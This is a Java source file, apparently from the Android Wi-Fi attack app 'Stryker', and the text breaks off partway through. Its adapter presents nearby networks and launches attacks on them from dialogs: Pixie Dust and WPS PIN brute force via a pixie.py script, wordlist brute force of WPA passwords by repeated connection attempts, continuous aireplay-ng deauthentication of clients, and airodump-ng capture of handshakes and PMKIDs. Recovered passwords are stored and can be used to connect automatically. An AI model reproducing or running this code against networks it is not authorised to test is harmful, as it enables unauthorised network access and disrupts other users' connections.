package com.zalexdev.stryker.wifi;


import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.Dialog;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.res.ColorStateList;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Build;
import android.text.Html;
import android.text.Layout;
import android.text.method.ScrollingMovementMethod;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.core.app.NotificationCompat;
import androidx.recyclerview.widget.RecyclerView;

import com.google.android.material.button.MaterialButton;
import com.google.android.material.card.MaterialCardView;
import com.google.android.material.dialog.MaterialAlertDialogBuilder;
import com.google.android.material.textfield.TextInputEditText;
import com.zalexdev.stryker.MainActivity;
import com.zalexdev.stryker.R;
import com.zalexdev.stryker.custom.WiFINetwork;
import com.zalexdev.stryker.utils.AdvancedProcess;
import com.zalexdev.stryker.utils.AdvancedThread;
import com.zalexdev.stryker.utils.Core;
import com.zalexdev.stryker.utils.MonitorManager;
import com.zalexdev.stryker.utils.SimpleProcess;
import com.zalexdev.stryker.utils.Utils;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Locale;
import java.util.Objects;
import java.util.Timer;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
    public ArrayList<WiFINetwork> wifilist;
    public Context context;
    public Activity activity;
    public int tag = 0;
    public Timer deauth;
    public Core core;
    public volatile AdvancedProcess pixie = null;
    public volatile AdvancedProcess oneshot = null;
    public volatile AdvancedProcess deauther = null;
    public volatile AdvancedProcess brutepin = null;
    public volatile AdvancedThread handshake = null;
    public volatile AdvancedThread brutepsk = null;
    public volatile AdvancedProcess airodump = null;
    public Timer aireplay;
    public String pinconnect;
    public String wordlistpath;
    private static final Pattern MAC_TOKEN = Pattern.compile("(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}");

    private String archiveCapture(String captureDir, String filename) {
        String safe = filename.replaceAll("[^A-Za-z0-9._-]", "_");
        if (safe.length() > 120) safe = safe.substring(safe.length() - 120);
        String dest = captureDir + "/" + safe;
        String hsDir = core.getShareRoot() + "/hs";
        //noinspection ResultOfMethodCallIgnored
        new java.io.File(captureDir).mkdirs();

        java.io.File[] caps = new java.io.File(hsDir)
                .listFiles((d, n) -> n.startsWith("handshake-") && n.endsWith(".cap"));
        java.io.File newest = null;
        if (caps != null) {
            for (java.io.File f : caps) {
                if (newest == null || f.lastModified() > newest.lastModified()) newest = f;
            }
        }
        if (newest != null) {
            core.moveFile(newest.getAbsolutePath(), dest);
            if (new java.io.File(dest).isFile()) return dest;
        }
        if (core.isRootless()) return null;

        // airodump wrote the capture as root from inside the chroot, and a root process does not
        // always share the app's view of shared storage: listFiles() above can come back empty
        // for a file that is really there. Retry the whole pick-and-move inside a mount-master
        // root shell, which joins the same namespace the app sees.
        core.customMegaCommand("mkdir -p '" + captureDir + "'; "
                + "src=$(ls -1t '" + hsDir + "'/handshake-*.cap 2>/dev/null | head -n 1); "
                + "if [ -n \"$src\" ]; then mv -f \"$src\" '" + dest + "'; fi");
        return new java.io.File(dest).isFile() ? dest : null;
    }


    public WiFIAdapter(Context context2, Activity mActivity, ArrayList<WiFINetwork> wifi) {
        context = context2;
        wifilist = wifi;
        activity = mActivity;
        try {wifi.sort(new WiFINetwork.WiFIComporator());}
        catch (Exception ignored){}
        core = new Core(context2);

    }

    @NonNull
    @Override
    public ViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {
        View v = LayoutInflater.from(context).inflate(R.layout.wifi_item, parent, false);
        return new ViewHolder(v);
    }

    @SuppressLint("SetTextI18n")
    @Override
    public void onBindViewHolder(@NonNull ViewHolder adapter, @SuppressLint("RecyclerView") final int position) {
        WiFINetwork wifi = wifilist.get(position);

        String mac = wifi.getMac();
        if (!core.getBoolean("hide")) {
            adapter.wifi_mac.setText(mac == null ? "" : mac.toUpperCase(Locale.ROOT));
        } else {
            adapter.wifi_mac.setText(Core.HIDDEN_MAC);
        }
        adapter.wifi_name.setText(wifi.getSsid());
        adapter.wifi_name.setSelected(true);

        adapter.five_mark.setVisibility(View.GONE);
        adapter.wps_mark.setVisibility(View.GONE);
        adapter.lock_mark.setVisibility(View.GONE);
        adapter.pixie_mark.setVisibility(View.GONE);
        adapter.key_mark.setVisibility(View.GONE);

        int signalPercent = Math.max(0, Math.min(100, 100 - wifi.getPower()));
        adapter.wifi_power.setText(signalPercent + "%");
        adapter.wifi_power.setTextColor(signalColor(signalPercent));
        if (adapter.icon != null) {
            adapter.icon.setColorFilter(signalColor(signalPercent));
        }

        if (wifi.getIs5hhz()) {
            adapter.five_mark.setVisibility(View.VISIBLE);
        }
        if (wifi.getWps() && !wifi.getBlocked()) {
            adapter.wps_mark.setVisibility(View.VISIBLE);
        } else if (wifi.getBlocked()) {
            adapter.lock_mark.setVisibility(View.VISIBLE);
        }
        if (wifi.getOK()) {
            adapter.key_mark.setVisibility(View.VISIBLE);
        }
        String vendor = wifi.getVendor();
        adapter.wifi_model.setText(vendor == null || vendor.isEmpty()
                ? context.getString(R.string.wifi_card_unknown_vendor)
                : vendor);
        if (wifi.getModel() != null && wifi.getModel().length() > 0) {
            adapter.wifi_model.setText(context.getString(R.string.wifi_card_model, wifi.getModel()));
            if (wifi.isVulnVerified()) {
                adapter.pixie_mark.setText(R.string.wifi_chip_pixie_verified);
                adapter.pixie_mark.setBackgroundTintList(ColorStateList.valueOf(0xFFE65100));
                adapter.pixie_mark.setTextColor(0xFFFFFFFF);
                adapter.pixie_mark.setVisibility(View.VISIBLE);
            } else if (wifi.isVulnerable()) {
                adapter.pixie_mark.setText(R.string.wifi_chip_pixie);
                adapter.pixie_mark.setBackgroundTintList(ColorStateList.valueOf(0xFFFFE0B2));
                adapter.pixie_mark.setTextColor(0xFFE65100);
                adapter.pixie_mark.setVisibility(View.VISIBLE);
            }
        }

        if (adapter.divider != null) {
            adapter.divider.setVisibility(position == wifilist.size() - 1 ? View.GONE : View.VISIBLE);
        }

        adapter.card.setOnClickListener(view -> newWifiDialog(wifilist.get(position)));
    }

    private int signalColor(int percent) {
        if (percent >= 65) return android.graphics.Color.parseColor("#2E7D32");
        if (percent >= 40) return android.graphics.Color.parseColor("#F57C00");
        return android.graphics.Color.parseColor("#C62828");
    }
    public void resizeImage(ImageView imageView, ProgressBar circle, boolean s) {
        if (s) {
        core.scale(imageView,0.65F);
        core.scale(circle,1.0F);}
        else {
            core.scale(imageView,1.0F);
            core.scale(circle,0.0F);
        }
    }


    @Override
    public int getItemCount() {
        return wifilist.size();
    }
    public void smoothScrool(TextView outputtext){
        if (outputtext != null) {
            int lineCount = outputtext.getLineCount();
            if (lineCount > 100) {
                outputtext.setText("");
            }
            Layout layout = outputtext.getLayout();
            if (layout != null) {
                final int scrollAmount = layout.getLineTop(outputtext.getLineCount()) - outputtext.getHeight();
                outputtext.scrollTo(0, Math.max(scrollAmount, 0));
            }
        }
    }

    public void newWifiDialog(WiFINetwork network){
        final Dialog dialog = new Dialog(context);
        dialog.setContentView(R.layout.new_wifi_dialog);
        android.view.Window window = dialog.getWindow();
        if (window != null) {
            window.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
            window.setLayout(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        }

        dialog.setCancelable(true);
        TextView name = dialog.findViewById(R.id.ssid);
        TextView mac = dialog.findViewById(R.id.mac);
        TextView model = dialog.findViewById(R.id.model);
        TextView info_text = dialog.findViewById(R.id.additional_text);
        ImageView info_image = dialog.findViewById(R.id.additional_img);
        LinearLayout wps_divider = dialog.findViewById(R.id.wps_divider);
        MaterialCardView pixie = dialog.findViewById(R.id.pixie_dust);
        MaterialCardView deauther = dialog.findViewById(R.id.deauth);
        MaterialCardView try_handshake = dialog.findViewById(R.id.handshake_capture);
        MaterialCardView custom_pin = dialog.findViewById(R.id.custom_pin);
        MaterialCardView null_pin = dialog.findViewById(R.id.null_pin);
        MaterialCardView brute_psk = dialog.findViewById(R.id.pass_bruteforce);
        MaterialCardView brute_pincode = dialog.findViewById(R.id.pin_bruteforce);
        MaterialCardView common_pins = dialog.findViewById(R.id.common_pins);
        MaterialCardView pmkid_capture = dialog.findViewById(R.id.pmkid_capture);
        MaterialCardView info = dialog.findViewById(R.id.additional_info);
        MaterialCardView wps_lock = dialog.findViewById(R.id.wps_locked);

        pmkid_capture.setOnClickListener(view -> {
            new MaterialAlertDialogBuilder(context)
                    .setTitle("PMKID Capture")
                    .setMessage("Pmkid capture are included into HS Capture attack. Please use HS Capture instead of PMKID Capture.")
                    .setPositiveButton(android.R.string.ok, (dialog1, which) -> {
                        dialog1.dismiss();
                    })
                    .setNegativeButton(android.R.string.cancel, (dialog12, which) -> dialog12.dismiss())
                    .show();
        });
        if (!network.getBlocked()){
            wps_lock.setVisibility(View.GONE);
        }
        else {
            wps_lock.setVisibility(View.VISIBLE);
        }
        if (!network.getWps()){
            wps_lock.setVisibility(View.GONE);
            wps_divider.setVisibility(View.GONE);
        }

        wps_lock.setOnClickListener(view -> {
            MaterialAlertDialogBuilder d = new MaterialAlertDialogBuilder(context)
                    .setTitle("WPS Locked")
                    .setMessage("Stryker detected that this network is WPS Locked. This means that you can't use WPS to connect to this network. You can still try wps attacks, but they will fail.")
                    .setPositiveButton(android.R.string.ok, (dialog1, which) -> dialog1.dismiss());
            d.show();
        });


        name.setText(network.getSsid());
        if (core.getBoolean("hide")){
            mac.setText(Core.HIDDEN_MAC);
        }else{
            mac.setText(network.getMac().toUpperCase(Locale.ROOT));
        }

        info.setOnClickListener(v -> {
            StringBuilder info1 = new StringBuilder();
            if (network.getOK()){
                info1.append("===============\n\nStored Password: ").append(network.getPsk()).append("\n\n===============\n\n\n");
            }
            for (String s : network.getInfo()){
                info1.append(s.trim().replace("*","    -")).append("\n");
            }
            MaterialAlertDialogBuilder d = new MaterialAlertDialogBuilder(context)
                    .setTitle("Additional info")
                    .setMessage(info1)
                    .setPositiveButton(android.R.string.ok, (dialog1, which) -> dialog1.dismiss());
            if(network.getOK()){
                d.setNeutralButton("Copy psk", (dialog1, which) -> {
                    ClipboardManager clipboard = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
                    ClipData clip = ClipData.newPlainText("password", network.getPsk());
                    clipboard.setPrimaryClip(clip);
                    Toast.makeText(context, "Password copied to clipboard", Toast.LENGTH_SHORT).show();
                    dialog1.dismiss();
                });
            }
            d.setNegativeButton("Copy", (dialog1, which) -> {
                ClipboardManager clipboard = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
                ClipData clip = ClipData.newPlainText("info", info1);
                clipboard.setPrimaryClip(clip);
                Toast.makeText(context, "Info copied to clipboard", Toast.LENGTH_SHORT).show();
                dialog1.dismiss();
            });
            d.show();

        });

        if (network.getSsid().contains("Hidden network")){brute_psk.setVisibility(View.GONE);}

        if (network.getModel()!=null){
            model.setText(network.getModel());
        }else {
            model.setVisibility(View.GONE);
        }
        pixie.setOnClickListener(view -> {
            attackDialog(network,1);
        });
        brute_psk.setOnClickListener(view -> {
            attackDialog(network,2);
        });
        try_handshake.setOnClickListener(view -> {
            attackDialog(network,3);
        });
        brute_pincode.setOnClickListener(view -> {
            attackDialog(network,4);
        });
        custom_pin.setOnClickListener(view -> {
            attackDialog(network,5);
        });
        null_pin.setOnClickListener(view -> {
            attackDialog(network,8);
        });
        common_pins.setOnClickListener(view -> {

            attackDialog(network,6);
        });
        deauther.setOnClickListener(view -> {
            attackDialog(network, 7);
        });


        dialog.show();

        }

    public void attackDialog(WiFINetwork network, int type){

        final Dialog dialog = new Dialog(context);
        dialog.setContentView(R.layout.wifi_dialog_attack);
        android.view.Window window = dialog.getWindow();
        if (window != null) {
            window.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
            window.setLayout(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        }
        dialog.setCancelable(false);
        TextView name = dialog.findViewById(R.id.wifi_name);
        TextView mac = dialog.findViewById(R.id.wifi_mac);
        TextView model = dialog.findViewById(R.id.wifi_model);
        TextView cancel = dialog.findViewById(R.id.wifi_cancel);
        TextView outputtext = dialog.findViewById(R.id.wifi_output);
        TextView resulttext = dialog.findViewById(R.id.wifi_result);

        TextView autoconnect = dialog.findViewById(R.id.wifi_autoconnect);
        ImageView wifiimg = dialog.findViewById(R.id.wifi_img);
        ProgressBar attack_progress = dialog.findViewById(R.id.attacking_progress);
        outputtext.setMovementMethod(new ScrollingMovementMethod());
        View outputcard = dialog.findViewById(R.id.output_card);




        name.setText(network.getSsid());
        mac.setText(network.getMac());
        if (core.getBoolean("hide")){
            mac.setText(Core.HIDDEN_MAC);
        }

        if (network.getModel()!=null){
            model.setText(network.getModel());
        }else {
            model.setVisibility(View.GONE);
        }
        final boolean[] finished = {false};
        final AtomicBoolean dialogCanceled = new AtomicBoolean(false);
        cancel.setOnClickListener(view -> {
            dialogCanceled.set(true);
            dialog.dismiss();
            if (pixie != null) {pixie.kill();}
            if (handshake != null) {handshake.setCanceled(true);}
            if (oneshot != null) {oneshot.kill();}
            if (brutepsk != null) {brutepsk.setCanceled(true);}
            if (brutepin != null) {brutepin.kill();}
            if (deauther != null) {deauther.kill();}
            if (airodump != null) {airodump.kill();}
            finished[0] = true;
            try{
                aireplay.cancel();
            }catch (Exception ignored){

            }
            new Thread(() -> {
                String hsIface = core.getHSInterface();
                String deauthIface = core.getDeauthInterface();
                boolean hsMon = core.monitorManager.isMonitorModeEnabled(hsIface);
                boolean deauthMon = !deauthIface.equals(hsIface)
                        && core.monitorManager.isMonitorModeEnabled(deauthIface);
                if (hsMon || deauthMon) {
                    core.toaster(activity, "Disabling monitor mode...");
                }
                if (hsMon) core.monitorManager.disableMonitorMode(hsIface);
                if (deauthMon) core.monitorManager.disableMonitorMode(deauthIface);
                restoreWpsInterface();
        }).start();



        });

        dialog.show();
        if (type == 1){
            final int[] scanCount = {0};
            String cmd = "python3 -u /CORE/PixieWps/pixie.py -i " + core.getWPSInterface()
                    + core.wpsIfaceDownFlag() + " -K -F -b " + network.getMac();
            new Thread(core::wpsDisableWifiIfEnabled, "wps-radio-off").start();
            pixie = new AdvancedProcess(activity, context, cmd, true) {
                @Override
                public void onFinished(ArrayList<String> outputList) {
                    restoreWpsInterface();
                    WiFINetwork result = pixie(outputList);
                    cancel.setText(android.R.string.ok);
                    outputcard.setVisibility(View.GONE);
                    resulttext.setVisibility(View.VISIBLE);
                    core.scale(wifiimg, 1.0F);
                    core.scale(attack_progress, 0.0F);
                    if (result.getOK()){
                        if (core.isStoreEnabled()) {
                            core.saveNetwork(network.getMac(),result.getPsk(),result.getPin(),network.ssid);
                        }
                        com.zalexdev.stryker.geomac.GeoHooks.recordPixie(
                                context, network.getMac(), network.ssid);
                        String sb = context.getResources().getString(R.string.pass) + " " +
                                result.getPsk() +
                                "\n" +
                                context.getResources().getString(R.string.piin) + " " +
                                result.getPin();
                        resulttext.setText(sb);
                        autoconnect.setVisibility(View.VISIBLE);
                        autoconnect.setOnClickListener(view -> {
                            autoconnect.setText("Trying to connect, please wait...");
                            core.connectWiFi2(network.getSsid(),result.getPsk());
                            core.connectWiFi2(network.getSsid(),result.getPsk());
                            new Thread(() -> {
                                long end = System.currentTimeMillis() + 20000;
                                while (System.currentTimeMillis() < end) {
                                    if (checkIsSsidConnected(network.getSsid())) {
                                        activity.runOnUiThread(() -> autoconnect.setText("Network connected successfully!"));
                                        return;
                                    }
                                    try {
                                        Thread.sleep(1000);
                                    } catch (InterruptedException e) {
                                        return;
                                    }
                                }
                                activity.runOnUiThread(() -> core.toaster("The network wait time was longer than expected."));
                            }).start();
                        });
                    }else if (Core.contains(outputList,"Unable to up interface") || Core.contains(outputList,"No such device")){
                        resulttext.setText("Please change interface before attacking");

                    }else {
                        resulttext.setText(context.getResources().getString(R.string.not_vuln_pixie));
                    }
                }

                @Override
                public void onNewLine(String line) {

                    if (line.contains("WPA PSK:")){
                        kill();
                    }
                    if (line.contains("Associating with AP…")){
                        scanCount[0]++;
                    }
                    if (scanCount[0] > 3){
                        kill();
                    }
                    if(core.getBoolean("hide")){
                        Matcher m = Pattern.compile("((\\w{2}:){5}\\w{2})").matcher(line);
                        if (m.find()){
                            line = line.replace(m.group(), Core.HIDDEN_MAC);
                        }
                    }
                    outputtext.append(line + "\n");
                    smoothScrool(outputtext);
                }

                @Override
                public void onEvent(String line) {

                }
            };

        }
        else if (type == 2){
            AtomicBoolean selected = new AtomicBoolean(false);
            WiFINetwork result = new WiFINetwork();
            ArrayList<String> get = core.getListFiles(core.getShareRoot() + "/wordlists");
            if (!get.isEmpty()){
                String[] w2 = new String[get.size()];
                for (int i = 0; i < get.size(); i++) {
                    w2[i] = get.get(i).replace(core.getShareRoot() + "/wordlists/", "");
                }
                new MaterialAlertDialogBuilder(context)
                        .setTitle(R.string.select_word2)
                        .setItems(w2, (dialogInterface, i) -> {
                            wordlistpath = get.get(i);
                            selected.set(true);
                            brutepsk = new AdvancedThread(activity, context) {
                                @Override
                                public void onFinished() {
                                    core.scale(wifiimg,1.0F);
                                    core.scale(attack_progress,0.0F);
                                    resulttext.setVisibility(View.VISIBLE);
                                    outputcard.setVisibility(View.GONE);
                                    cancel.setText(android.R.string.ok);
                                    if (result.getOK()){
                                        String sb = context.getResources().getString(R.string.pass) + " " +
                                                result.getPsk() +
                                                "\n";
                                        resulttext.setText(sb);
                                        autoconnect.setVisibility(View.VISIBLE);
                                        autoconnect.setOnClickListener(view -> {
                                            autoconnect.setText("Trying to connect, please wait...");
                                            core.connectWiFi2(network.getSsid(),result.getPsk());
                                            core.connectWiFi2(network.getSsid(),result.getPsk());
                                            new Thread(() -> {
                                                long end = System.currentTimeMillis() + 20000;
                                                while (System.currentTimeMillis() < end) {
                                                    if (checkIsSsidConnected(network.getSsid())) {
                                                        activity.runOnUiThread(() -> autoconnect.setText("Network connected successfully!"));
                                                        return;
                                                    }
                                                    try {
                                                        Thread.sleep(1000);
                                                    } catch (InterruptedException e) {
                                                        return;
                                                    }
                                                }
                                                activity.runOnUiThread(() -> core.toaster("The network wait time was longer than expected."));
                                            }).start();
                                        });
                                    }else {
                                        resulttext.setText("Password not found");
                                    }
                                }

                                @Override
                                public void eventListener(String line) {
                                    outputtext.append(line + "\n");
                                    smoothScrool(outputtext);
                                }

                                @Override
                                public void doOnBackground() {
                                    try (BufferedReader br = new BufferedReader(new FileReader(core.getShareRoot() + "/wordlists/"+wordlistpath))) {
                                        String psk;
                                        while ((psk = br.readLine()) != null) {
                                            if (this.canceled){break;}
                                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                                createBruteNotification(context.getResources().getString(R.string.trying)+psk,0,1);
                                            }
                                            sendEvent(context.getResources().getString(R.string.trying)+ psk);
                                            int netId = core.connectWiFi2(network.getSsid(), psk);
                                            try {
                                                Thread.sleep(6000);
                                            } catch (InterruptedException e) {
                                                e.printStackTrace();
                                            }
                                            if (checkIsSsidConnected(network.getSsid())) {
                                                result.setOK(true);
                                                result.setPsk(psk);
                                                result.setSsid(network.getSsid());
                                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                                    createBruteNotification(context.getResources().getString(R.string.succes)+psk,1,1);
                                                }
                                                break;
                                            }else {
                                                core.deleteWifi(netId);
                                            }
                                        }
                                    } catch (IOException e) {
                                        e.printStackTrace();
                                    }
                                }

                                @Override
                                public void onCanceled() {

                                }
                            };
                        }).setOnDismissListener(dialogInterface -> {
                            if (!selected.get()){
                                dialog.dismiss();
                            }

                        })
                        .show();
              }else{
                outputtext.append("No wordlist found!\nPlease put worldlist in Stryker/wordlists/ and try again!\n");
            }

        }
        else if (type == 3){

            Timer deauthtimer = new Timer();
            final boolean[] hsStatus = {false};
            final boolean[] pmkidStatus = {false};
            ArrayList<String> clients = new ArrayList<>();
            ArrayList<String> dclients = new ArrayList<>();
            String data = "<b><p style='color:#2E7D32'>Airodump-ng running normally - {s}</p></b>\n\n"+
                    "<p>{deauth}</p>\n\n"+
                    "\n\n<b><p>Clients (total - {total}): {clients}</p></b>\n\n";
            final String[] deauthNow = {"Aireplay-ng deauth not running"};
            final String[] second = {"1s"};
            handshake = new AdvancedThread(activity,context) {
                @Override
                public void onFinished() {
                    core.scale(wifiimg,1.0F);
                    core.scale(attack_progress,0.0F);
                    resulttext.setVisibility(View.VISIBLE);
                    outputcard.setVisibility(View.GONE);
                    cancel.setText(android.R.string.ok);
                    if (hsStatus[0]){
                    resulttext.setText("Handshake captured!\n Check Stryker/captured/ folder");}
                    else if (pmkidStatus[0]){
                        resulttext.setText("PMKID captured!\n Check Stryker/captured/ folder");
                    }
                    else {
                        resulttext.setText("Handshake not captured");
                    }
                }

                @Override
                public void eventListener(String line) {
                    outputtext.append(line + "\n");
                    smoothScrool(outputtext);
                }

                @Override
                public void doOnBackground() {
                    boolean deauth = true;
                    boolean monitor;
                    boolean monitor2 = true;

                    String wlanscan = core.getHSInterface();
                    String deauthPref = core.getDeauthInterface();
                    ArrayList<String> clients = new ArrayList<>();
                    if (!core.isRootless() && !core.isInternalDeauthEnabled()
                            && MonitorManager.isInternalRadio(deauthPref)){
                        if (!MonitorManager.isInternalRadio(wlanscan)) {
                            deauthPref = wlanscan;
                            sendEvent("Deauth interface is the internal radio — using " + wlanscan + " instead (enable 'Deauth with internal adapter' in Settings to use it)");
                        } else {
                            deauth = false;
                        }
                    }
                    final String wlandeauth = deauthPref;
                    sendEvent("Enabling monitor mode...");
                    monitor = core.monitorManager.enableMonitorMode(wlanscan, String.valueOf(network.getChannel()));
                    if (deauth && !wlanscan.equals(wlandeauth)){
                        monitor2 = core.monitorManager.enableMonitorMode(wlandeauth,String.valueOf(network.getChannel()));
                    }

                    final boolean[] airoRunning = {false};

                    if (monitor && monitor2){
                        sendEvent("Starting airodump-ng...");
                        core.customChrootCommand("mkdir -p /sdcard/Stryker/hs /sdcard/Stryker/captured; "
                                + "rm -f /sdcard/Stryker/hs/handshake*");
                        final String capIface = core.getHSInterface();
                        if (canceled) return;
                        new Thread(() -> {
                            if (canceled) return;
                            String cmd = "airodump-ng " + capIface + " -w /sdcard/Stryker/hs/handshake  --ignore-negative-one --output-format pcap -c "+network.getChannel()+" --bssid " + network.getMac()+" --update 3";
                            if (network.getIs5hhz() && network.getChannel() <= 0){
                                cmd = "airodump-ng " + capIface + " -w /sdcard/Stryker/hs/handshake --ignore-negative-one --output-format pcap  --bssid " + network.getMac() + " --band a --update 3";
                            }


                            core.getLogger().writeLine("Starting airodump-ng... " + cmd,1);

                            airodump =     new AdvancedProcess(activity, context, cmd, true) {
                                @Override
                                public void onFinished(ArrayList<String> outputList) {

                                }

                                @Override
                                public void onNewLine(String line) {
                                    try {
                                        if (line == null) return;
                                        if (line.contains(network.getMac().toUpperCase()) || line.contains(network.getMac()) || line.contains(network.getMac().toLowerCase()) || line.contains(" WPA")){
                                            airoRunning[0] = true;
                                        }
                                        if (line.contains("[") && line.contains("]")){
                                            String[] split = line.split("]");
                                            if (split.length > 1){
                                                second[0] = split[1].replace("Elapsed:","").replaceAll("\\s+","").replace("[","").replace("]","");
                                            }
                                        }

                                        line = line.replace(network.getMac().toUpperCase(),"");
                                        line = line.trim().replaceAll("\\s+"," ");
                                        if (line.contains("WPA handshake:")){
                                            sendEvent("Handshake captured! Bingo!");
                                            hsStatus[0] = true;
                                        }
                                        if (line.contains("PMKID")){
                                            sendEvent("PMKID captured! Bingo!");
                                            pmkidStatus[0] = true;
                                        }
                                        for (String token : line.split(" ")){
                                            if (token.length() == 17 && token.indexOf(':') == 2
                                                    && MAC_TOKEN.matcher(token).matches()
                                                    && !clients.contains(token)){
                                                clients.add(token);
                                                sendEvent("New client found : "+token);
                                                break;
                                            }
                                        }
                                    } catch (Exception ignored) {
                                    }
                                }

                                @Override
                                public void onEvent(String line) {

                                }
                            };
                            airodump.setNoLog(true);
                            if (canceled) airodump.kill();
                        }).start();
                        sendEvent("We are waiting for network to appear...");
                        long appearDeadline = System.currentTimeMillis() + 60000;
                        while (!airoRunning[0] && !canceled && System.currentTimeMillis() < appearDeadline){
                            try {
                                Thread.sleep(1000);
                            } catch (InterruptedException e) {
                                break;
                            }
                        }
                        if (canceled) return;
                        if (!airoRunning[0]){
                            sendEvent("Target never showed up on this channel — aborting.");
                            if (airodump != null) airodump.kill();
                            setCanceled(true);
                            return;
                        }
                            sendEvent("Airodump-ng launched!");
                            if (!deauth){
                                sendEvent("Can`t deauth with (s)wlan0 interface! Passive mode!");
                            }else{
                            sendEvent("Starting deauth...");}
                            final String deauthIface = core.monitorManager.isMonitorModeEnabled(wlandeauth + "mon")
                                    ? wlandeauth + "mon" : wlandeauth;
                            final String hsIface = capIface;
                            final boolean internalDeauth = !core.isRootless()
                                    && !core.isInternalDeauthEnabled()
                                    && MonitorManager.isInternalRadio(deauthIface);
                            final String[] lastRelock = {""};
                            if (deauth) {
                                deauther = new AdvancedProcess(activity, context, "aireplay-ng --ignore-negative-one -0 0 -a  " + network.getMac() + " " + deauthIface, true) {
                                    @Override
                                    public void onFinished(ArrayList<String> outputList) {

                                    }

                                    @Override
                                    public void onNewLine(String line) {
                                        deauthNow[0] = line;
                                        if (line.contains("available") || line.contains("but")) {
                                           deauthNow[0] =  "Deauth failed! Passive mode now! Error: \n"+line;
                                           if (line.contains("but")){
                                               String[] parts = line.trim().split("\\s+");
                                               String ch = parts[parts.length - 1];
                                               if (ch.matches("\\d{1,3}") && !ch.equals(lastRelock[0])) {
                                                   lastRelock[0] = ch;
                                                   core.threadChrootCommand("iw dev " + hsIface + " set channel " + ch);
                                               }
                                           }
                                            if (internalDeauth) {
                                                deauthNow[0] = "Can`t deauth with (s)wlan0 interface! Passive mode!";
                                            }
                                            smoothScrool(outputtext);
                                        }

                                    }

                                    @Override
                                    public void onEvent(String line) {

                                    }
                                };
                            }
                            while (!hsStatus[0] && !pmkidStatus[0] && !canceled){
                                    if (airodump != null && !airodump.isRunning()){
                                        sendEvent("airodump-ng stopped unexpectedly — aborting.");
                                        break;
                                    }
                                    StringBuilder cls = new StringBuilder();
                                    for (String client : clients){
                                        cls.append(client).append(" ");
                                    }
                                    activity.runOnUiThread(() -> {
                                        String dataset = data.replace("{s}",second[0]).replace("{clients}",cls.toString()).replace("{total}",String.valueOf(clients.size())).replace("{deauth}", deauthNow[0]);
                                        if (core.getBoolean("hide")){
                                            dataset = dataset.replace(network.getMac(),Core.HIDDEN_MAC).replace(network.getMac().toUpperCase(),Core.HIDDEN_MAC).replace(network.getMac().toLowerCase(),Core.HIDDEN_MAC);
                                        }
                                        outputtext.setText(Html.fromHtml(dataset));
                                    });
                                    try {
                                        Thread.sleep(200);
                                    } catch (InterruptedException e) {
                                        e.printStackTrace();
                                    }
                            }
                            if (deauther != null) {
                            deauther.kill();
                            }
                            if (airodump != null) {
                            airodump.kill();
                            }
                            if (canceled) return;
                            String captureDir = core.getShareRoot() + "/captured";
                            String time = new SimpleDateFormat("MM_HH_mm", Locale.ENGLISH).format(new Date());
                            String label = hsStatus[0] ? "HS_" : "PMKID_";
                            String filename = label + network.getSsid().replace(" ", "_") + time + ".cap";
                            sendEvent(hsStatus[0] ? "Handshake captured!" : "PMKID captured!");
                            String saved = archiveCapture(captureDir, filename);
                            if (saved == null) {
                                sendEvent("Capture file not found — nothing was saved.");
                            } else {
                                sendEvent((hsStatus[0] ? "Handshake" : "PMKID") + " saved to " + saved);
                                com.zalexdev.stryker.geomac.GeoHooks.recordHandshake(
                                        context, network.getMac(), network.ssid);
                            }
                            activity.runOnUiThread(this::onFinished);

                    }else {
                        sendEvent("Failed to start monitor mode");
                        setCanceled(true);
                    }
                }

                @Override
                public void onCanceled() {
                    sendEvent("Attack was canceled due to critical error, please check log for more information!");
                    activity.runOnUiThread(() -> {
                        core.scale(wifiimg,1.0F);
                        core.scale(attack_progress,0.0F);
                        cancel.setText(android.R.string.ok);
                        deauthtimer.cancel();
                        if(airodump != null){
                            airodump.kill();
                        }
                        if(deauther != null){
                            deauther.kill();
                        }


                    });

                }
            };
            
        }
        else if (type == 4){
            String cmd = "python3 -u /CORE/PixieWps/pixie.py -i " + core.getWPSInterface() + " -B -b " + network.getMac();
            if (core.getString(network.getMac()+"_pin").length() > 0){
                cmd = cmd + " -p " + core.getString(network.getMac()+"_pin");
                outputtext.append("Restoring progress: "+core.getString(network.getMac()+"_pin")+"\n");
            }




            brutepin = new AdvancedProcess(activity,context,cmd,true) {
                @Override
                public void onFinished(ArrayList<String> outputList) {
                    WiFINetwork back = issuccess(outputList);
                    outputcard.setVisibility(View.GONE);
                    resulttext.setVisibility(View.VISIBLE);
                    if (back.getOK()){
                        if (core.isStoreEnabled()) {
                            core.saveNetwork(network.getMac(),back.getPsk(),back.getPin(),network.ssid);
                        }
                        core.scale(wifiimg,1.0F);
                        core.scale(attack_progress,0.0F);
                        cancel.setText(android.R.string.ok);
                        resulttext.setText(context.getResources().getString(R.string.piin)+ back.getPin()+"\n"+context.getResources().getString(R.string.pass) + back.getPsk());
